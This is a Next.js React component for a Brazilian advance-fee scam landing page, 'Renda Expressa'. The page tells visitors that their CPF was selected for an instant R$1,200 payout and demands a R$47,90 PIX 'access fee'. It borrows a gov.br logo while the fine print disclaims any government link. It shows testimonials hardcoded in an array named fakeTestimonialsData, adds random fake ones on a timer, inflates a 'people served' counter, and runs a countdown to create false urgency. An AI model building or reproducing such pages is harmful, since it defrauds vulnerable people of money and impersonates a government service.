
"use client";

import type React from 'react';
import { useState, useEffect } from 'react';
import Image from 'next/image';
import OfferTimer from '@/components/features/OfferTimer';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { CheckCircle, TrendingUp, Zap, AlertTriangle, ShieldCheck, Check, Star, ShoppingCart } from 'lucide-react';

interface OfferStepProps {
  cpf: string | null;
}

interface Testimonial {
  name: string;
  location: string;
  text: string;
  stars: number;
  photoUrl?: string;
}

const fakeTestimonialsData: Testimonial[] = [
  {
    name: "MARIA S.",
    location: "Fortaleza/CE",
    text: "Achei que era golpe, mas arrisquei os R$47,90 e ME SALVOU! R$1200 na conta em MINUTOS. Indico de olhos fechados!",
    stars: 5,
    photoUrl: "https://placehold.co/56x56.png", 
  },
  {
    name: "J. COSTA",
    location: "Interior de MG",
    text: "Desconfiado, paguei a taxa. QUE ALÍVIO! O dinheiro extra veio em ÓTIMA HORA. Valeu CADA CENTAVO!",
    stars: 5,
    photoUrl: "https://placehold.co/56x56.png",
  },
  {
    name: "ANA P.",
    location: "Salvador/BA",
    text: "Plataforma simples, PIX rápido e R$1200 liberados! Os R$47,90 foram o melhor investimento do mês. RECOMENDO!",
    stars: 5,
    photoUrl: "https://placehold.co/56x56.png",
  },
];


const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
  const [peopleServed, setPeopleServed] = useState(2347);
  const [testimonials, setTestimonials] = useState<Testimonial[]>(fakeTestimonialsData);

  useEffect(() => {
    const interval = setInterval(() => {
      setPeopleServed(prev => prev + Math.floor(Math.random() * 5) + 1);
    }, 1500); 

    const testimonialInterval = setInterval(() => {
      const names = ["CARLOS R.", "SOFIA L.", "PAULO G.", "LUCIA F."];
      const locations = ["Curitiba/PR", "Manaus/AM", "Brasília/DF", "Porto Alegre/RS"];
      const newTestimonial: Testimonial = {
        name: names[Math.floor(Math.random() * names.length)],
        location: locations[Math.floor(Math.random() * locations.length)],
        text: "Funciona mesmo! Recebi o valor e a taxa foi tranquila. Recomendo muito!",
        stars: 5,
        photoUrl: "https://placehold.co/56x56.png",
      };
      setTestimonials(prev => [newTestimonial, ...prev.slice(0, prev.length-1)].sort(() => 0.5 - Math.random()));
    }, 8000);

    return () => {
      clearInterval(interval);
      clearInterval(testimonialInterval);
    };
  }, []);

  const handleLiberarAcessoClick = () => {
    console.log("LIBERAR ACESSO IMEDIATO AGORA clicado! CPF:", cpf, "Redirect to R$47,90 checkout.");
    alert("Você será redirecionado para a página de pagamento da taxa de R$47,90. Após o PIX, seus R$1.200 serão liberados IMEDIATAMENTE.");
  };

  const formattedCpf = cpf ? `***.${cpf.substring(4, 7)}.${cpf.substring(8, 11)}-**` : '***.***.***-**';

  return (
    <div className="w-full max-w-2xl mx-auto px-4 pb-4 md:px-6 md:pb-6 bg-background text-foreground pt-0">
      <Card className="mb-4 shadow-sm rounded-lg border-0 bg-slate-50">
        <CardContent className="p-3 flex items-center">
          <Image
            src="https://i.imgur.com/SQWMv5D.png"
            alt="gov.br logo"
            width={80}
            height={80}
            className="rounded-md"
            data-ai-hint="government logo"
          />
        </CardContent>
      </Card>

      <Card className="border-primary shadow-2xl rounded-lg overflow-hidden">
        <CardContent className="p-4 md:p-6 space-y-5"> 
          
          <div className="text-center">
             <h2 className="font-headline text-2xl md:text-3xl font-bold text-primary mb-2">
              <span className="text-destructive">URGENTE: CPF <span className="underline">{formattedCpf}</span> SELECIONADO!</span><br/>Benefícios EXCLUSIVOS <strong className="text-accent">LIBERADOS AGORA!</strong>
            </h2>
            
            <ul className="space-y-2 text-left text-sm md:text-base max-w-md mx-auto bg-secondary/20 p-4 rounded-lg border border-primary/30 shadow">
              {[
                { text: "**SAQUE IMEDIATO:** <span class='text-accent font-bold text-lg'>R$1.200,00</span> direto na sua conta <span class='underline'>HOJE!</span>" },
                { text: "**ACESSO VIP ILIMITADO:** Plataforma Exclusiva (Valor R$197,00 - <span class='text-accent font-bold'>GRÁTIS HOJE</span>)" },
                { text: "**SUPORTE PRIORITÁRIO 24h:** Atendimento WhatsApp <span class='italic'>Ultra Rápido</span>." },
                { text: "**BÔNUS EXTRA:** Limpe seu Nome! Análise de Crédito Completa (SPC/Serasa)." },
              ].map((benefit, index) => (
                <li key={index} className="flex items-start">
                  <CheckCircle className="h-6 w-6 text-accent mr-2 mt-0.5 shrink-0" />
                  <span className="font-medium" dangerouslySetInnerHTML={{ __html: benefit.text.replace(/\*\*(.*?)\*\*/g, '<strong class="text-primary-foreground/90">$1</strong>') }} />
                </li>
              ))}
            </ul>
          </div>

          <div className="bg-destructive text-destructive-foreground p-3 sm:p-4 rounded-lg border-2 border-red-900 text-center shadow-xl animate-pulse">
            <div className="flex flex-wrap items-center justify-center text-center font-bold text-md sm:text-lg md:text-xl mb-1">
              <AlertTriangle className="h-5 w-5 sm:h-6 sm:w-6 mr-1 sm:mr-1.5" />
              <span className="text-xs sm:text-sm md:text-base mr-1">OFERTA EXPIRA EM:</span> <OfferTimer initialMinutes={5} initialSeconds={0} />
            </div>
            <p className="text-xs sm:text-sm md:text-md font-semibold uppercase">RISCO IMINENTE: PERDA TOTAL DO BENEFÍCIO ÀS 23:59 DE HOJE!</p>
          </div>

          <div className="text-center p-4 md:p-6 bg-blue-700/10 rounded-xl shadow-lg border-2 border-accent ring-2 ring-accent/50">
            <h3 className="font-headline text-lg md:text-xl font-bold text-primary-foreground mb-1 uppercase">Taxa ÚNICA de Acesso ao Sistema</h3>
            <p className="text-5xl md:text-7xl font-bold text-accent mb-1">
              R$ 47<span className="text-3xl md:text-5xl align-top">,90</span>
            </p>
            <p className="text-muted-foreground line-through text-xl md:text-2xl mb-2">DE <span className="font-semibold">R$197,00</span> <span className="text-red-500 font-bold">(ECONOMIZE 75% HOJE!)</span></p>
            <p className="text-sm md:text-md text-primary-foreground/80 max-w-lg mx-auto">
              Pague <strong className="text-accent">APENAS HOJE esta taxa administrativa</strong> para cobrir custos de transação e consulta segura. <strong className="text-accent underline">Liberação INSTANTÂNEA dos seus R$1.200,00 GARANTIDA após PIX!</strong>
            </p>
          </div>

          <Button
            className="w-full h-16 md:h-20 text-xl md:text-2xl font-bold bg-green-500 text-white hover:bg-green-600 shadow-xl animate-bounce transform hover:scale-105 transition-transform duration-150 ease-out ring-4 ring-green-300 hover:ring-green-400"
            onClick={handleLiberarAcessoClick}
          >
            <ShoppingCart className="mr-2 h-7 md:h-8 w-7 md:h-8 animate-ping absolute left-4 opacity-50" />
            <Zap className="mr-2 h-7 md:h-8 w-7 md:h-8" />
            <span className="uppercase">QUERO LIBERAR MEUS R$1.200 AGORA!</span> (PIX)
          </Button>
          <div className="text-center text-xs text-muted-foreground flex items-center justify-center">
            <ShieldCheck className="h-4 w-4 mr-1 text-green-600" /> Pagamento 100% Seguro via PIX. Seus dados estão PROTEGIDOS. Transação processada por AppMax.
          </div>
          
          <div className="my-6 md:my-8">
            <h3 className="font-headline text-xl md:text-2xl font-bold text-primary text-center mb-5 uppercase">
              Comunidade <span className="text-accent">VERIFICADA</span>: Veja Quem <span className="underline">JÁ SAC</span>OU!
            </h3>
            <div className="space-y-4">
              {testimonials.map((testimonial, index) => (
                <Card key={index} className="bg-muted/40 border-secondary shadow-lg rounded-lg hover:shadow-xl transition-shadow">
                  <CardContent className="p-4 md:p-5">
                    <div className="flex items-start">
                        {testimonial.photoUrl && (
                            <Image
                            src={testimonial.photoUrl}
                            alt={`Foto de ${testimonial.name}`}
                            width={56} 
                            height={56}
                            data-ai-hint="person avatar"
                            className="rounded-full mr-4 border-2 border-accent shadow-md"
                            />
                        )}
                        <div className="flex-1">
                            <div className="flex items-center mb-1.5">
                                {[...Array(testimonial.stars)].map((_, i) => (
                                <Star key={i} className="w-5 h-5 text-yellow-400 fill-yellow-400 mr-0.5" />
                                ))}
                                <Check className="h-5 w-5 text-green-500 ml-auto mr-1" /> <span className="text-xs text-green-600 font-semibold uppercase">Saque Confirmado</span>
                            </div>
                            <p className="text-md md:text-lg text-foreground italic leading-tight">"{testimonial.text}"</p>
                            <p className="text-sm text-muted-foreground mt-2 font-semibold">- {testimonial.name}, {testimonial.location} <span className="text-xs text-gray-500"> (Verificado ✅)</span></p>
                        </div>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>
            <div className="mt-10 text-center p-5 bg-primary text-primary-foreground rounded-lg shadow-xl border-2 border-yellow-300">
              <TrendingUp className="h-10 md:h-12 w-10 md:h-12 mx-auto mb-2 text-yellow-300 animate-pulse" />
              <p className="text-4xl md:text-5xl font-bold">{peopleServed.toLocaleString('pt-BR')}</p>
              <p className="text-md md:text-lg font-semibold uppercase">BRASILEIROS JÁ ATENDIDOS HOJE!</p>
            </div>
          </div>
            <p className="text-xs text-muted-foreground/70 text-center mt-6 px-2">
                Taxa única de serviço para acesso ao sistema e processamento da consulta. Valor promocional válido apenas hoje.
                Este sistema realiza consultas públicas automáticas. Não possuímos vínculo direto com o governo federal.
                Renda Expressa &copy; {new Date().getFullYear()} - Todos os direitos (não tão) reservados. CNPJ: XX.XXX.XXX/0001-XX.
            </p>
        </CardContent>
      </Card>
    </div>
  );
};

export default OfferStep;

    
